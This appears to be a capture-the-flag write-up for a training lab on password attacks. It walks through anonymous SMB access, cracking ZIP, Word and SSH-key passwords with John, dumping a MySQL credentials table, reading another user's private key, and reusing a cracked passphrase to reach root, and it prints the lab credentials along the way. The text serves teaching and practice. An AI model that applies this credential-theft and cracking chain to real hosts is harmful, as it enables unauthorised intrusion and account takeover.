>Host is a workstation used by an employee for their day-to-day work. 
>These types of hosts are often used to exchange files with other employees and are typically administered by administrators over the network.
>During a meeting with the client, we were informed that many internal users use this host as a jump host. 
>The focus is on securing and protecting files containing sensitive information.  

## Enumeration  

>NMAP Scans and results:  

```
sudo nmap -p 22,139,445 10.129.202.221 -sCV -A -O

### SMB  

>Enumerate if any shares allow anonymous or null unauthenticated read of data and files.

```
smbmap -u '' -H 10.129.202.221
```  

>Discovering a share `SHAREDRIVE` that allow read access anonymously.  

```
smbclient -N \\\\10.129.202.221\\SHAREDRIVE

get Docs.zip
```

>Extract the ZIP password hash, and then Crack password protected zip file using `John`.  

```
zip2john Docs.zip >docs.hash

john docs.hash --wordlist=resources/demo-pass.lst
```  

>Cracking the Office Document DOCX file password with `office2john`. [Cracking Documents](https://academy.hackthebox.com/module/147/section/1322)  

```
office2john Documentation.docx >office.hash

john office.hash --show
```

>Office DOCX file password cracked as `987654321`, and discover the Microsoft Word Document content as below.  

![office2john-Password-Attacks-Lab-Medium](/images/office2john-Password-Attacks-Lab-Medium.png)  

>Discovered password information from word document, as below:  

```

Root password is jason:C4mNKjAtL2dydsYa6
>10.129.200.21</inlane.configure.localIp>

http://localhost:8080/cms 
```  

## Foothold

>Gain access to target as `jason` via ssh with the password `C4mNKjAtL2dydsYa6`.  

>Based on the document discovered, enumeration indicate local internal HTTP service on port 8080.

### Local Service Discovery  

>`netstat` and `ss` commands to determine internal ports not accessible on victim from kali externally.   

```
netstat -antup

ss -tulpn
```  

![netstat-Password-Attacks-Lab-Medium](/images/netstat-Password-Attacks-Lab-Medium.png)  

>Discovered MySQL on port 3306 internally. [Interacting with Common Services - SMB,SQL,RDP,DNS & SMTP](https://academy.hackthebox.com/module/116/section/1140)  
>Using credentials for `jason` and password of `C4mNKjAtL2dydsYa6` to connect locally to SQL.  

```
mysql -u jason -p

show databases;
use users;
show tables;

select * from creds where name like 'dennis';
```  

![SQL-Password-Attacks-Lab-Medium](/images/SQL-Password-Attacks-Lab-Medium.png)  

>Credentials for the user `dennis` and the password discovered is `7AUgWWQEiMPdqx`.  

## Lateral Movement  

>Logged in as `dennis` user with the discovered credentials on the internal MySQL service, creds table.

```
su dennis

cd /home/dennis/.ssh
cat id_rsa
```   

>Crack the id_rsa key password for `dennis` using John.  

```
ssh2john id_rsa_dennis.ssh > ssh.hash

john ssh.hash --wordlist=../mut_password.list

ssh dennis@10.129.202.221 -i id_rsa_dennis.ssh
```

>Password for the cracked id_rsa file is `P@ssw0rd12020!`.

## Privilege Escalation  

>Re using the SSH Key from Dennis in an SSH as root with found password for the id_rsa key file Reuse the Password `P@ssw0rd12020!`.  

```
ssh root@10.129.202.221 -i id_rsa_dennis.ssh
id
whoami

cat /root/flag.txt
```

### Port Forwarding  

>Extra: Did not use the port forwarding to privilege escalate, but did for enumeration internal services.  

>[Dynamic Port Forwarding with SSH and SOCKS Tunneling](https://academy.hackthebox.com/module/158/section/1426)  

```
ssh -L 33060:localhost:33060 dennis@10.129.202.221 -i id_rsa_dennis.ssh
```
